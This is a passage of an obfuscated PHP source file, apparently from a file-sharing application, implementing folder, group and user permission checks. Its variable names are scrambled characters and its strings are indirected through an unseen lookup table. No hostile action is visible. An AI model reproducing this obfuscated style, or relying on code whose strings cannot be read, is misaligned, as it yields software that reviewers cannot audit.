= 1; $ÜÂ†é– = array($ÇÜé©•Ø); if ($îëÖêŒë[$óª¯·ÅÄ[190]] == $óª¯·ÅÄ[222] && $îëÖêŒë[$óª¯·ÅÄ[547]] != $º°•„è†) { $ÜÂ†é– = $this->groupChidldAllRootSource($îëÖêŒë[$óª¯·ÅÄ[547]]); } $àãÁñå– = $this->field($óª¯·ÅÄ[191])->group($óª¯·ÅÄ[191])->select(); $àãÁñå– = array_to_keyvalue($àãÁñå–, $óª¯·ÅÄ[22], $óª¯·ÅÄ[191]); if (!$àãÁñå–) { return array(); } $»àß¶å = $óª¯·ÅÄ[2066]; $ßÅàè˜‰ = array($óª¯·ÅÄ[191] => array($óª¯·ÅÄ[17], $àãÁñå–), $óª¯·ÅÄ[482] => $óª¯·ÅÄ[222]); $ß«‘âõ = Model($óª¯·ÅÄ[865])->field($»àß¶å)->where($ßÅàè˜‰)->select(); $˜ïÍ†š = array($ÇÜé©•Ø); foreach ($ß«‘âõ as $ôô×Ø³œ) { foreach ($ÜÂ†é– as $´¯ÀÄÅ£) { $œ·óÒ…Î = $óª¯·ÅÄ[60] . $´¯ÀÄÅ£ . $óª¯·ÅÄ[60]; $ô‘¤›“Ã = $ôô×Ø³œ[$óª¯·ÅÄ[562]] . $ôô×Ø³œ[$óª¯·ÅÄ[191]] . $óª¯·ÅÄ[60]; if (strstr($ô‘¤›“Ã, $œ·óÒ…Î)) { $˜ïÍ†š[] = $ôô×Ø³œ[$óª¯·ÅÄ[191]]; break; } } } return $this->sourceListAuth($˜ïÍ†š); } private function sourceListAuth($³™Õâ§) { $ıÚó¤ë =& $_SERVER[ú÷îèÆÜ]; $‰¡±êç = Model($ıÚó¤ë[1373])->sourceListInfo($³™Õâ§, !0); $®áËÅŞ = $this->sourceAuthSelect($³™Õâ§); $¹¹–Šî¤ = array(); $—›Ÿˆû = array(); foreach ($‰¡±êç as $¬Ğâã®Ğ) { unset($¬Ğâã®Ğ[$ıÚó¤ë[506]]); unset($¬Ğâã®Ğ[$ıÚó¤ë[504]]); unset($¬Ğâã®Ğ[$ıÚó¤ë[464]]); unset($¬Ğâã®Ğ[$ıÚó¤ë[97]]); $ü™ÑÕ×– = $®áËÅŞ[$¬Ğâã®Ğ[$ıÚó¤ë[191]]]; if (!$ü™ÑÕ×–) { continue; } $¬Ğâã®Ğ[$ıÚó¤ë[2067]] = $this->authTargetInfo($ü™ÑÕ×–); $¬Ğâã®Ğ[$ıÚó¤ë[560]] = rtrim($¬Ğâã®Ğ[$ıÚó¤ë[566]], $ıÚó¤ë[18]) . $ıÚó¤ë[18] . ltrim($¬Ğâã®Ğ[$ıÚó¤ë[560]], $ıÚó¤ë[18]); $¹¹–Šî¤[] = $¬Ğâã®Ğ; $ÕÆ£É‡˜ = count(explode($ıÚó¤ë[18], trim($¬Ğâã®Ğ[$ıÚó¤ë[560]], $ıÚó¤ë[18]))); $—›Ÿˆû[] = $ÕÆ£É‡˜ + ($¬Ğâã®Ğ[$ıÚó¤ë[43]] == $ıÚó¤ë[85] ? 0 : 1000); } array_multisort($—›Ÿˆû, SORT_ASC, $¹¹–Šî¤); return $¹¹–Šî¤; } private function groupChidldAllRootSource($ì£¾íÃÌ) { $² ßŒ¶É =& $_SERVER[ú÷îèÆÜ]; $íèÂª²“ = Model($² ßŒ¶É[2068])->groupChildrenAll($ì£¾íÃÌ); $òñÉ’»° = array($² ßŒ¶É[190] => 0, $² ßŒ¶É[547] => array($² ßŒ¶É[17], $íèÂª²“), $² ßŒ¶É[188] => SourceModel::TYPE_GROUP); $¦Î·ß’¶ = Model($² ßŒ¶É[865])->field($² ßŒ¶É[191])->where($òñÉ’»°)->select(); $¦Î·ß’¶ = array_to_keyvalue($¦Î·ß’¶, $² ßŒ¶É[22], $² ßŒ¶É[191]); return $¦Î·ß’¶; } private function authTargetInfo($¤óº¤š) { $ĞÂùÙœŠ =& $_SERVER[ú÷îèÆÜ]; $¨ç§¹É = array(); $±»Ø„¡ = array(); $Ÿî§ºËÒ = 2 << 25; foreach ($¤óº¤š as $¸œ«ŞÓº) { $†âÀ™ÌÉ = Model($ĞÂùÙœŠ[549])->listData($¸œ«ŞÓº[$ĞÂùÙœŠ[1987]]); if (!$†âÀ™ÌÉ) { continue; } if ($¸œ«ŞÓº[$ĞÂùÙœŠ[188]] == SourceModel::TYPE_USER) { $Á·—¢€º = Model($ĞÂùÙœŠ[555])->getInfoSimpleOuter($¸œ«ŞÓº[$ĞÂùÙœŠ[547]]); if ($Á·—¢€º[$ĞÂùÙœŠ[1685]] == $ĞÂùÙœŠ[1229]) { continue; } if ($Á·—¢€º[$ĞÂùÙœŠ[1685]] == $ĞÂùÙœŠ[222]) { $Á·—¢€º[$ĞÂùÙœŠ[42]] = LNG($ĞÂùÙœŠ[2069]); } } else { $Á·—¢€º = Model($ĞÂùÙœŠ[563])->getInfoSimple($¸œ«ŞÓº[$ĞÂùÙœŠ[547]]); } if (!$Á·—¢€º) { continue; } $Á·—¢€º[$ĞÂùÙœŠ[517]] = $†âÀ™ÌÉ; $¨ç§¹É[] = $Á·—¢€º; $ê ñ² = 0; if ($¸œ«ŞÓº[$ĞÂùÙœŠ[188]] == SourceModel::TYPE_GROUP) { $ê ñ² = $Ÿî§ºËÒ * 2; } if ($¸œ«ŞÓº[$ĞÂùÙœŠ[188]] == SourceModel::TYPE_USER) { $ê ñ² = $Ÿî§ºËÒ; } if ($¸œ«ŞÓº[$ĞÂùÙœŠ[188]] == SourceModel::TYPE_USER && $¸œ«ŞÓº[$ĞÂùÙœŠ[547]] == $ĞÂùÙœŠ[222]) { $ê ñ² = 0; } $±»Ø„¡[] = $†âÀ™ÌÉ[$ĞÂùÙœŠ[464]] + $ê ñ²; } array_multisort($±»Ø„¡, SORT_DESC, $¨ç§¹É); return $¨ç§¹É; } public function getAllChildrenByUser($¶ˆçı÷, $Ïƒİ‰èø) { $ë¯Î§Ú¯ =& $_SERVER[ú÷îèÆÜ]; $øÔÑ¬‰ = Model($ë¯Î§Ú¯[576])->getInfo($Ïƒİ‰èø); if (!$Ïƒİ‰èø || !$¶ˆçı÷ || !$øÔÑ¬‰) { return array(); } $‘Ñ÷éíˆ = Model($ë¯Î§Ú¯[1373])->sourceInfo($¶ˆçı÷); $ûâË¨âı = array(); $‚Ş¸Ôêğ = 1; if ($‘Ñ÷éíˆ[$ë¯Î§Ú¯[190]] == $ë¯Î§Ú¯[222] && $‘Ñ÷éíˆ[$ë¯Î§Ú¯[547]] != $‚Ş¸Ôêğ && $this->groupContainUser($‘Ñ÷éíˆ[$ë¯Î§Ú¯[547]], $Ïƒİ‰èø)) { foreach ($øÔÑ¬‰[$ë¯Î§Ú¯[2070]] as $”ŞÌ…®Ç) { $›²…Ëº = Model($ë¯Î§Ú¯[563])->getInfo($”ŞÌ…®Ç[$ë¯Î§Ú¯[1883]]); $¯ÆÅÖœ€ = Model($ë¯Î§Ú¯[576])->getInfoSimpleOuter($Ïƒİ‰èø); $¯ÆÅÖœ€[$ë¯Î§Ú¯[517]] = $”ŞÌ…®Ç[$ë¯Î§Ú¯[464]]; if (Model($ë¯Î§Ú¯[549])->authCheckAction($”ŞÌ…®Ç[$ë¯Î§Ú¯[464]][$ë¯Î§Ú¯[464]], $ë¯Î§Ú¯[1904])) { continue; } $û˜ò¥Ú = array($ë¯Î§Ú¯[42] => $ë¯Î§Ú¯[1249] . $›²…Ëº[$ë¯Î§Ú¯[42]], $ë¯Î§Ú¯[191] => $›²…Ëº[$ë¯Î§Ú¯[97]][$ë¯Î§Ú¯[191]], $ë¯Î§Ú¯[94] => KodIO::make($›²…Ëº[$ë¯Î§Ú¯[97]][$ë¯Î§Ú¯[191]]), $ë¯Î§Ú¯[190] => $ë¯Î§Ú¯[222], $ë¯Î§Ú¯[188] => $ë¯Î§Ú¯[556], $ë¯Î§Ú¯[43] => $ë¯Î§Ú¯[593], $ë¯Î§Ú¯[560] => $›²…Ëº[$ë¯Î§Ú¯[567]], $ë¯Î§Ú¯[1883] => $›²…Ëº[$ë¯Î§Ú¯[1883]], $ë¯Î§Ú¯[564] => $›²…Ëº[$ë¯Î§Ú¯[190]], $ë¯Î§Ú¯[2067] => array($¯ÆÅÖœ€)); $ûâË¨âı[$û˜ò¥Ú[$ë¯Î§Ú¯[191]]] = $û˜ò¥Ú; } } $ë´…ı˜± = array(); $ß©ÜÉ¡‘ = $this->getAllChildren($¶ˆçı÷); foreach ($ß©ÜÉ¡‘ as $şš‘îŞÜ) { $–‹Ê¾ò = !1; foreach ($şš‘îŞÜ[$ë¯Î§Ú¯[2067]] as $ÌŞ§í‘´) { if ($ÌŞ§í‘´[$ë¯Î§Ú¯[1685]]) { if ($ÌŞ§í‘´[$ë¯Î§Ú¯[1685]] == $Ïƒİ‰èø) { $–‹Ê¾ò = !0; break; } } if ($ÌŞ§í‘´[$ë¯Î§Ú¯[1883]]) { if ($this->groupContainUser($ÌŞ§í‘´[$ë¯Î§Ú¯[1883]], $Ïƒİ‰èø)) { $–‹Ê¾ò = !0; break; } } } if ($–‹Ê¾ò) { $ë´…ı˜±[] = $şš‘îŞÜ; } $†¨ÈÜè = $şš‘îŞÜ[$ë¯Î§Ú¯[191]]; if (isset($ûâË¨âı[$†¨ÈÜè])) { $şš‘îŞÜ[$ë¯Î§Ú¯[2067]][] = $ûâË¨âı[$†¨ÈÜè][0]; $ûâË¨âı[$†¨ÈÜè] = !1; } } $ûâË¨âı = array_filter(array_values($ûâË¨âı)); $ë´…ı˜± = array_merge($ûâË¨âı, $ë´…ı˜±); return $ë´…ı˜±; } public function setAllChildrenByUser($‚†›¬Èı, $²‘Îò, $ıÇˆ»áó) { $‚·¹ï… =& $_SERVER[ú÷îèÆÜ]; $ªå¼È¬ = $this->getAllChildrenByUser($‚†›¬Èı, $²‘Îò); if (!$ıÇˆ»áó || !$ªå¼È¬) { return !1; } foreach ($ªå¼È¬ as $ÑÇ»êü) { $‹úû°¿ = array(); foreach ($ÑÇ»êü[$‚·¹ï…[2067]] as $öÙºÑí) { $Ó€„Ãú = $öÙºÑí[$‚·¹ï…[517]]; $£ªü©„æ = $öÙºÑí[$‚·¹ï…[1685]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÅËĞ·è¨ = $öÙºÑí[$‚·¹ï…[1685]] ? $öÙºÑí[$‚·¹ï…[1685]] : $öÙºÑí[$‚·¹ï…[1883]]; if ($öÙºÑí[$‚·¹ï…[1685]] && $öÙºÑí[$‚·¹ï…[1685]] == $²‘Îò) { continue; } $‹úû°¿[] = array($‚·¹ï…[191] => $ÑÇ»êü[$‚·¹ï…[191]], $‚·¹ï…[188] => $£ªü©„æ, $‚·¹ï…[547] => intval($ÅËĞ·è¨), $‚·¹ï…[1987] => isset($Ó€„Ãú[$‚·¹ï…[452]]) ? intval($Ó€„Ãú[$‚·¹ï…[452]]) : 0, $‚·¹ï…[2047] => isset($Ó€„Ãú[$‚·¹ï…[2047]]) ? intval($Ó€„Ãú[$‚·¹ï…[2047]]) : -1); } $‹úû°¿[] = array($‚·¹ï…[191] => $ÑÇ»êü[$‚·¹ï…[191]], $‚·¹ï…[188] => SourceModel::TYPE_USER, $‚·¹ï…[547] => intval($²‘Îò), $‚·¹ï…[1987] => intval($ıÇˆ»áó), $‚·¹ï…[2047] => -1); $this->where(array($‚·¹ï…[468] => $ÑÇ»êü[$‚·¹ï…[191]]))->delete(); $this->addAll($‹úû°¿); } return !0; } public function get($„á ª†ô) { $ø´À†¼  = $this->getSourceList(array($„á ª†ô), !0); return $ø´À†¼ [0]; } public function getSourceList($ÓŞ×ô²‹, $Ò‹­ÀŠ = false, $¹ğü×öè = false) { $‚Ô³ş°† =& $_SERVER[ú÷îèÆÜ]; if (!$ÓŞ×ô²‹) { return array(); } $Ã½ûÓÜ = Model($‚Ô³ş°†[1373]); if (!$Ò‹­ÀŠ && count($ÓŞ×ô²‹) == 1) { $Ò‹­ÀŠ = array(); $Ò‹­ÀŠ[$ÓŞ×ô²‹[0]] = $Ã½ûÓÜ->sourceInfo($ÓŞ×ô²‹[0]); } if (!$Ò‹­ÀŠ) { $ß©äêğí = array($‚Ô³ş°†[468] => array($‚Ô³ş°†[469], $ÓŞ×ô²‹)); $Ò‹­ÀŠ = $Ã½ûÓÜ->field($‚Ô³ş°†[2071])->where($ß©äêğí)->select(); $Ò‹­ÀŠ = array_to_keyvalue($Ò‹­ÀŠ, $‚Ô³ş°†[191]); } $ëÜ²îÂú = $ÓŞ×ô²‹; foreach ($Ò‹­ÀŠ as $ÔÒêô  => $á³ëëÈµ) { $ó’éÂÏ‹ = $Ã½ûÓÜ->parentLevelArray($á³ëëÈµ[$‚Ô³ş°†[562]]); $ëÜ²îÂú = array_merge($ëÜ²îÂú, array($ÔÒêô ), array_reverse($ó’éÂÏ‹)); } $ëÜ²îÂú = array_values(array_unique($ëÜ²îÂú)); if (!$ëÜ²îÂú) { return array(); } $¸ñÀ—Ï = $this->sourceAuthSelect($ëÜ²îÂú); $³ßäÒƒ¼ = array(); foreach ($ëÜ²îÂú as $”ö‰ÌÈ) { if (isset($¸ñÀ—Ï[$”ö‰ÌÈ])) { $³ßäÒƒ¼[$”ö‰ÌÈ] = $¸ñÀ—Ï[$”ö‰ÌÈ]; } } $ŠûøÒÆù = $this->userIsRoot($¹ğü×öè); $ÆÂĞŒ™í = AuthModel::authAll(); $¬ÁùŸŸì = array($‚Ô³ş°†[465] => $ÆÂĞŒ™í, $‚Ô³ş°†[2072] => array($‚Ô³ş°†[470] => 0, $‚Ô³ş°†[1889] => $ÆÂĞŒ™í, $‚Ô³ş°†[471] => LNG($‚Ô³ş°†[2073]), $‚Ô³ş°†[1906] => $‚Ô³ş°†[2074])); $¥¨ŠäªÙ = array(); foreach ($Ò‹­ÀŠ as $”ö‰ÌÈ => $ñ½ŞÙ ø) { if ($ŠûøÒÆù && $GLOBALS[$‚Ô³ş°†[16]][$‚Ô³ş°†[1902]]) { $¥¨ŠäªÙ[$”ö‰ÌÈ] = $¬ÁùŸŸì; continue; } $¥¨ŠäªÙ[$”ö‰ÌÈ] = $this->makeSourceAuth($ñ½ŞÙ ø, $³ßäÒƒ¼, $¹ğü×öè); } return $¥¨ŠäªÙ; } public function authDeepCheck($åº›§¤°, $¡ëŸ‡—Í = false) { $•¸êÙ©” =& $_SERVER[ú÷îèÆÜ]; $¡ëŸ‡—Í = $¡ëŸ‡—Í ? $¡ëŸ‡—Í : USER_ID; $†¥–íí» = $this->makeAuthDeep($¡ëŸ‡—Í); if (!in_array($åº›§¤°, $†¥–íí»[$•¸êÙ©”[2075]])) { return !1; } $»ûÆ¸Ç = array(); foreach ($†¥–íí»[$•¸êÙ©”[2076]] as $âäİİßš => $ßÙ‚ş—) { if (!in_array($åº›§¤°, $ßÙ‚ş—)) { continue; } $»ûÆ¸Ç[] = $âäİİßš; } if (!$»ûÆ¸Ç) { return !1; } $‘İ§¼òå = $»ûÆ¸Ç ? $»ûÆ¸Ç[0] : $åº›§¤°; return array($•¸êÙ©”[465] => -1, $•¸êÙ©”[517] => array($•¸êÙ©”[470] => $•¸êÙ©”[1229], $•¸êÙ©”[1889] => $•¸êÙ©”[222], $•¸êÙ©”[471] => LNG($•¸êÙ©”[2077]), $•¸êÙ©”[1906] => $•¸êÙ©”[2078]), $•¸êÙ©”[2079] => LNG($•¸êÙ©”[2080]), $•¸êÙ©”[2081] => $this->sourceAuthInfo($‘İ§¼òå)); } protected function makeAuthDeep($¾ÇÇâ³í = false) { $åßäÜÍó =& $_SERVER[ú÷îèÆÜ]; static $§²•¿Æ = array(); $¾ÇÇâ³í = $¾ÇÇâ³í ? $¾ÇÇâ³í : USER_ID; if (isset($§²•¿Æ[$¾ÇÇâ³í])) { return $§²•¿Æ[$¾ÇÇâ³í]; } $‡¨İ£æÌ = Model($åßäÜÍó[2082])->listData(); $Íë½ç£ = array(); foreach ($‡¨İ£æÌ as $º‹ Ê’Â) { if ($º‹ Ê’Â[$åßäÜÍó[464]] == 0 && $º‹ Ê’Â[$åßäÜÍó[1905]] == $åßäÜÍó[98]) { $Íë½ç£[] = $º‹ Ê’Â[$åßäÜÍó[452]]; } } $¸Œ¤€ÊÁ = $this->userGroupParents($¾ÇÇâ³í); $û±Ìƒ¾‡ = array($åßäÜÍó[188] => SourceModel::TYPE_USER, $åßäÜÍó[547] => $¾ÇÇâ³í); if ($¸Œ¤€ÊÁ) { $û±Ìƒ¾‡ = array(array($åßäÜÍó[188] => SourceModel::TYPE_USER, $åßäÜÍó[547] => $¾ÇÇâ³í), array($åßäÜÍó[188] => SourceModel::TYPE_GROUP, $åßäÜÍó[547] => array($åßäÜÍó[469], $¸Œ¤€ÊÁ)), $åßäÜÍó[1041] => $åßäÜÍó[1981]); } $¡Ü©ãĞÎ = $this->field($åßäÜÍó[2083])->where($û±Ìƒ¾‡)->select(); $¿Ç¦ë¡ó = array(); $Ì¬¿ç‰— = array_to_keyvalue_group($¡Ü©ãĞÎ, $åßäÜÍó[191]); foreach ($Ì¬¿ç‰— as $ƒ Ï¨İ² => $¤¢õ†„‡) { $Ü’¦İ¦• = $this->authArrayCheck($¤¢õ†„‡, $¾ÇÇâ³í); if ($Ü’¦İ¦•[$åßäÜÍó[465]] > 0) { $¿Ç¦ë¡ó[] = $ƒ Ï¨İ² . $åßäÜÍó[22]; } } if ($¸Œ¤€ÊÁ) { $çä¤ã = Model($åßäÜÍó[563]); foreach ($¸Œ¤€ÊÁ as $Øèú™‘É) { $Ã›ßú« = $çä¤ã->getInfo($Øèú™‘É); if (!$Ã›ßú« || !is_array($Ã›ßú«[$åßäÜÍó[97]])) { continue; } $¿Ç¦ë¡ó[] = $Ã›ßú«[$åßäÜÍó[97]][$åßäÜÍó[191]]; } } $çäÕº×¯ = array(); $è‘µõÙ = $¸Œ¤€ÊÁ; $Ş™êİº = Model($åßäÜÍó[1373]); $çä¤ã = Model($åßäÜÍó[563]); $•úğÉ“Ù = array(); $¨¡¥ºèõ = array(); $ÈÕ“àÛø = array(); $¹áñâ¨– = array(); if ($¿Ç¦ë¡ó) { $õöÔ£ù— = $Ş™êİº->where(array($åßäÜÍó[191] => array($åßäÜÍó[469], $¿Ç¦ë¡ó)))->select(); foreach ($õöÔ£ù— as $Ößì“ùŞ) { $ûøòˆ = $Ş™êİº->parentLevelArray($Ößì“ùŞ[$åßäÜÍó[562]]); $çäÕº×¯ = array_merge($çäÕº×¯, $ûøòˆ); $è‘µõÙ[] = $Ößì“ùŞ[$åßäÜÍó[547]]; $•úğÉ“Ù[$Ößì“ùŞ[$åßäÜÍó[191]]] = $ûøòˆ; $¨¡¥ºèõ[$Ößì“ùŞ[$åßäÜÍó[191]]] = $Ößì“ùŞ[$åßäÜÍó[547]]; } } $è‘µõÙ = array_values(array_unique($è‘µõÙ)); $ÚŠ„­ÒÀ = $è‘µõÙ; foreach ($ÚŠ„­ÒÀ as $Øèú™‘É) { $Ã›ßú« = $çä¤ã->getInfo($Øèú™‘É); $ûøòˆ = $Ş™êİº->parentLevelArray($Ã›ßú«[$åßäÜÍó[562]]); $è‘µõÙ = array_merge($è‘µõÙ, $ûøòˆ); } $è‘µõÙ = array_values(array_unique($è‘µõÙ)); foreach ($è‘µõÙ as $Øèú™‘É) { $Ã›ßú« = $çä¤ã->getInfo($Øèú™‘É); $çäÕº×¯[] = $Ã›ßú«[$åßäÜÍó[97]][$åßäÜÍó[191]]; $ÈÕ“àÛø[$Øèú™‘É] = $Ã›ßú«[$åßäÜÍó[97]][$åßäÜÍó[191]]; $¹áñâ¨–[$Øèú™‘É] = $Ş™êİº->parentLevelArray($Ã›ßú«[$åßäÜÍó[562]]); } foreach ($•úğÉ“Ù as $ª­Ò›ì‡ => $—­°—Çª) { $†Ô›èâ = $¨¡¥ºèõ[$ª­Ò›ì‡]; if (!$†Ô›èâ || !$ÈÕ“àÛø[$†Ô›èâ]) { continue; } $ü¤Óş«° = array(); foreach ($¹áñâ¨–[$†Ô›èâ] as $Øèú™‘É) { $ü¤Óş«°[] = $ÈÕ“àÛø[$Øèú™‘É]; } $•úğÉ“Ù[$ª­Ò›ì‡] = array_merge($ü¤Óş«°, $—­°—Çª); } $çäÕº×¯ = array_values(array_unique($çäÕº×¯)); $£¢ôô‡™ = array($åßäÜÍó[2075] => $çäÕº×¯, $åßäÜÍó[2076] => $•úğÉ“Ù); $§²•¿Æ[$¾ÇÇâ³í] = $£¢ôô‡™; return $£¢ôô‡™; } private function makeSourceAuth($§å«©ğ, $¤²Â«±û, $áÜ²¾Ù = false) { $¿¥òŠíò =& $_SERVER[ú÷îèÆÜ]; $ÕÛ‰°à = $¿¥òŠíò[98]; $¼™Ùà¦ = $§å«©ğ[$¿¥òŠíò[547]]; $—ö³Á¸ = $§å«©ğ[$¿¥òŠíò[188]] == SourceModel::TYPE_GROUP; $‰Ù½·©Ğ = $—ö³Á¸ ? $this->groupRootAuth($¼™Ùà¦, $áÜ²¾Ù) : !1; if ($‰Ù½·©Ğ && Model($¿¥òŠíò[549])->authCheckAction($‰Ù½·©Ğ[$¿¥òŠíò[464]], $¿¥òŠíò[1904])) { return $this->groupAuthInfo($‰Ù½·©Ğ, $¼™Ùà¦); } $áàéáë = Model($¿¥òŠíò[1373])->parentLevelArray($§å«©ğ[$¿¥òŠíò[562]]); $áàéáë = array_merge(array($§å«©ğ[$¿¥òŠíò[191]]), array_reverse($áàéáë)); $¦­Õõ¯ = !1; foreach ($áàéáë as $½½Ê®Â·) { if (!isset($¤²Â«±û[$½½Ê®Â·])) { continue; } $ óŞÆÕ¨ = $this->authMake($¤²Â«±û[$½½Ê®Â·], $áÜ²¾Ù); if ($ óŞÆÕ¨[$¿¥òŠíò[517]]) { $¦­Õõ¯ = $ óŞÆÕ¨; break; } } if (!$—ö³Á¸) { return $¦­Õõ¯; } if (!$¦­Õõ¯ && $‰Ù½·©Ğ) { $¦­Õõ¯ = $this->groupAuthInfo($‰Ù½·©Ğ, $¼™Ùà¦); } if (!$¦­Õõ¯) { $³Õï³í = Model($¿¥òŠíò[563])->getInfo($¼™Ùà¦); $ûóªºæ = explode($¿¥òŠíò[60], trim($³Õï³í[$¿¥òŠíò[562]], $¿¥òŠíò[60])); $ûóªºæ = array_reverse($ûóªºæ); foreach ($ûóªºæ as $¨øãŠ‡ø) { if ($¨øãŠ‡ø == $¿¥òŠíò[222] || $¨øãŠ‡ø == $ÕÛ‰°à) { continue; } $®Ò‘ø”Á = $this->groupRootAuth($¨øãŠ‡ø, $áÜ²¾Ù); if (!$®Ò‘ø”Á) { continue; } $¦­Õõ¯ = $this->groupAuthInfo($®Ò‘ø”Á, $¨øãŠ‡ø); break; } } if (!$¦­Õõ¯ || $¦­Õõ¯[$¿¥òŠíò[465]] <= 0) { $ì¦ç’Ğ‰ = $this->authDeepCheck($§å«©ğ[$¿¥òŠíò[191]], $áÜ²¾Ù); if ($ì¦ç’Ğ‰) { $¦­Õõ¯ = $ì¦ç’Ğ‰; } } return $¦­Õõ¯; } private function userIsRoot($û”şâœ = false) { $ïæ¾àøô =& $_SERVER[ú÷îèÆÜ]; if (!$û”şâœ && _get($GLOBALS, $ïæ¾àøô[545])) { return !0; } $°üìî¬Ï = Model($ïæ¾àøô[576])->getInfo($û”şâœ); $ôª‚ßÕ¤ = Model($ïæ¾àøô[2084])->listData($°üìî¬Ï[$ïæ¾àøô[1561]]); if ($ôª‚ßÕ¤ && $ôª‚ßÕ¤[$ïæ¾àøô[553]][$ïæ¾àøô[2085]] == 1) { return !0; } return !1; } private function sourceAuthInfo($óæ†èÒû) { $í±šê×€ =& $_SERVER[ú÷îèÆÜ]; $‡ Ñ˜ÇÊ = Model($í±šê×€[1373]); $¯ß­†Ò¨ = $‡ Ñ˜ÇÊ->sourceInfo($óæ†èÒû); if (!$¯ß­†Ò¨) { return !1; } $‡ Ñ˜ÇÊ->groupPathDisplay($¯ß­†Ò¨); $¬¨¸‰‹Ü = array($¯ß­†Ò¨); $¬¨¸‰‹Ü = $‡ Ñ˜ÇÊ->_listAppendPath($¬¨¸‰‹Ü); $¯ß­†Ò¨ = $¬¨¸‰‹Ü[0]; $ÏÇé¦¡« = $¯ß­†Ò¨[$í±šê×€[560]]; if (isset($¯ß­†Ò¨[$í±šê×€[568]])) { $¿½Å€Ò„ = explode($í±šê×€[18], trim($¯ß­†Ò¨[$í±šê×€[560]], $í±šê×€[18])); array_shift($¿½Å€Ò„); $ÏÇé¦¡« = $¯ß­†Ò¨[$í±šê×€[566]] . $í±šê×€[2086] . implode($í±šê×€[18], $¿½Å€Ò„); } return array($í±šê×€[471] => $¯ß­†Ò¨[$í±šê×€[42]], $í±šê×€[94] => KodIO::make($¯ß­†Ò¨[$í±šê×€[191]]), $í±šê×€[2087] => $ÏÇé¦¡«); } private function groupAuthInfo($¨ô€ëÉÌ, $›—™ÇÂô) { $±˜İ´‰¦ =& $_SERVER[ú÷îèÆÜ]; $Öšíş«È = Model($±˜İ´‰¦[563])->getInfo($›—™ÇÂô); return array($±˜İ´‰¦[2088] => intval($¨ô€ëÉÌ[$±˜İ´‰¦[464]]), $±˜İ´‰¦[2072] => $¨ô€ëÉÌ, $±˜İ´‰¦[2089] => LNG($±˜İ´‰¦[2090]), $±˜İ´‰¦[2081] => array($±˜İ´‰¦[471] => $Öšíş«È[$±˜İ´‰¦[42]], $±˜İ´‰¦[94] => KodIO::make($Öšíş«È[$±˜İ´‰¦[97]][$±˜İ´‰¦[191]]), $±˜İ´‰¦[2087] => $Öšíş«È[$±˜İ´‰¦[567]])); } protected function groupRootAuth($Ôíù‘Äç, $ÉÂ¡î = false) { $ÔÄÌÒ‚” =& $_SERVER[ú÷îèÆÜ]; $ÉÂ¡î = $ÉÂ¡î ? $ÉÂ¡î : USER_ID; $Ó»‹ı¼ƒ = $ÉÂ¡î . $ÔÄÌÒ‚”[2091] . $Ôíù‘Äç; static $¼—©åªè = array(); if (isset($¼—©åªè[$Ó»‹ı¼ƒ])) { return $¼—©åªè[$Ó»‹ı¼ƒ]; } $Ôû¤ò˜Ä = Model($ÔÄÌÒ‚”[563])->getInfo($Ôíù‘Äç); $é»Ç¹Èğ = $this->userGroupList($ÉÂ¡î); $‘ÍŸ®Ÿ¨ = isset($é»Ç¹Èğ[$Ôíù‘Äç]) ? $é»Ç¹Èğ[$Ôíù‘Äç][$ÔÄÌÒ‚”[464]] : !1; if ($‘ÍŸ®Ÿ¨ && Model($ÔÄÌÒ‚”[549])->authCheckAction($‘ÍŸ®Ÿ¨[$ÔÄÌÒ‚”[464]], $ÔÄÌÒ‚”[1904])) { $¼—©åªè[$Ó»‹ı¼ƒ] = $‘ÍŸ®Ÿ¨; return $‘ÍŸ®Ÿ¨; } $Ø°‹©é = $this->sourceAuthSelect($Ôû¤ò˜Ä[$ÔÄÌÒ‚”[97]][$ÔÄÌÒ‚”[191]]); $®—÷ÆÇã = $Ø°‹©é ? $this->authMake($Ø°‹©é, $ÉÂ¡î) : !1; $õ€Í©¼Ş = $®—÷ÆÇã ? $®—÷ÆÇã[$ÔÄÌÒ‚”[517]] : !1; $¼—©åªè[$Ó»‹ı¼ƒ] = $õ€Í©¼Ş ? $õ€Í©¼Ş : $‘ÍŸ®Ÿ¨; return $¼—©åªè[$Ó»‹ı¼ƒ]; } public function authOwnerApply($Å‚ğÄ) { $À‘áÁÔ =& $_SERVER[ú÷îèÆÜ]; if (empty($Å‚ğÄ[$À‘áÁÔ[464]]) || isset($Å‚ğÄ[$À‘áÁÔ[2092]]) && $Å‚ğÄ[$À‘áÁÔ[2092]]) { return $Å‚ğÄ; } if (AuthModel::authCheckRoot($Å‚ğÄ[$À‘áÁÔ[464]][$À‘áÁÔ[465]])) { return $Å‚ğÄ; } $‚¿É¶ğ‘ = Model($À‘áÁÔ[1373])->parentLevelArray($Å‚ğÄ[$À‘áÁÔ[562]]); $‚¿É¶ğ‘ = array_merge(array($Å‚ğÄ[$À‘áÁÔ[191]]), array_reverse($‚¿É¶ğ‘)); $–â´¹± = $this->sourceAuthSelect($‚¿É¶ğ‘); $¥ªÇ•ƒÀ = array(); $“ß°µßè = array(); foreach ($–â´¹± as $òî×Şâ­ => $ƒ­¿ş¸à) { $˜®ÚƒËœ = $this->authFolderOwnerUser($ƒ­¿ş¸à); $¥ªÇ•ƒÀ[$òî×Şâ­] = $˜®ÚƒËœ; $“ß°µßè = array_merge($“ß°µßè, $˜®ÚƒËœ[$À‘áÁÔ[639]]); if ($˜®ÚƒËœ[$À‘áÁÔ[2093]]) { break; } } if (count($“ß°µßè) == 0) { $“ß°µßè = $this->authFolderOwnerGroup($Å‚ğÄ[$À‘áÁÔ[547]]); } $“ß°µßè = array_unique($“ß°µßè); if (AuthModel::authCheckRoot($Å‚ğÄ[$À‘áÁÔ[464]][$À‘áÁÔ[465]])) { $“ß°µßè[] = USER_ID; } $Å‚ğÄ[$À‘áÁÔ[464]][$À‘áÁÔ[2094]] = Model($À‘áÁÔ[555])->userListInfo($“ß°µßè); return $Å‚ğÄ; } private function authFolderOwnerGroup($ñÃ´»áÀ) { $ƒéÃÜ×Š =& $_SERVER[ú÷îèÆÜ]; $ªò­®Ü§ = Model($ƒéÃÜ×Š[1973])->where(array($ƒéÃÜ×Š[1883] => $ñÃ´»áÀ))->select(); $¢ˆ¶‡¶û = array(); if (!$ªò­®Ü§) { return $¢ˆ¶‡¶û; } foreach ($ªò­®Ü§ as $š´ú†¨‘) { $–ùù…³ = $this->authInfo($š´ú†¨‘); if (AuthModel::authCheckRoot($–ùù…³[$ƒéÃÜ×Š[464]])) { $¢ˆ¶‡¶û[] = $š´ú†¨‘[$ƒéÃÜ×Š[1685]]; } } return $¢ˆ¶‡¶û; } private function authFolderOwnerUser($š­é¿™ê) { 